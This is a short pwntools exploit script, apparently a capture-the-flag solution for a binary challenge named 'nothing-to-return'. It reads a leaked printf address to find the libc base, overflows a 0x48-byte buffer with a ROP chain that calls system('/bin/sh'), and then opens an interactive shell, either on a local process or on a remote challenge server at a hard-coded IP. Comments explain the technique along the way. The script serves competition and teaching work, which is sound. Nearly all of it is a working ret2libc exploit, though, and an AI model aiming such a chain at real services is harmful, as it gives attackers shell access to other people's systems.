from pwn import *

elf = ELF( "../chal/nothing-to-return")
libc = ELF("../chal/libc.so.6")

if args.REMOTE:
    io = remote('34.30.126.104', 5000)
else:
    io = elf.process()
    pause()

io.recvuntil(b'printf is at 0x')
# in pwntools, you can rebase ELF object like this
libc.address = int(io.recvline(), 16) - libc.sym['printf']

# you can also use the ROP module of pwntools, but I prefer to use raw ROP chain
pop_rdi = libc.address +  0x0000000000028265 # : pop rdi ; ret
ret     = libc.address +  0x000000000002648d # : ret

rop_chain = [
    pop_rdi,
    # you can search the string in libc like this using pwntools
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym['system']
]

payload = b'A' * 0x48 + b''.join(map(p64, rop_chain))

io.recvuntil(b'size:\n')
io.sendline(str(len(payload)).encode('ascii'))

io.recvuntil(b'input:\n')
io.send(payload)

io.interactive()
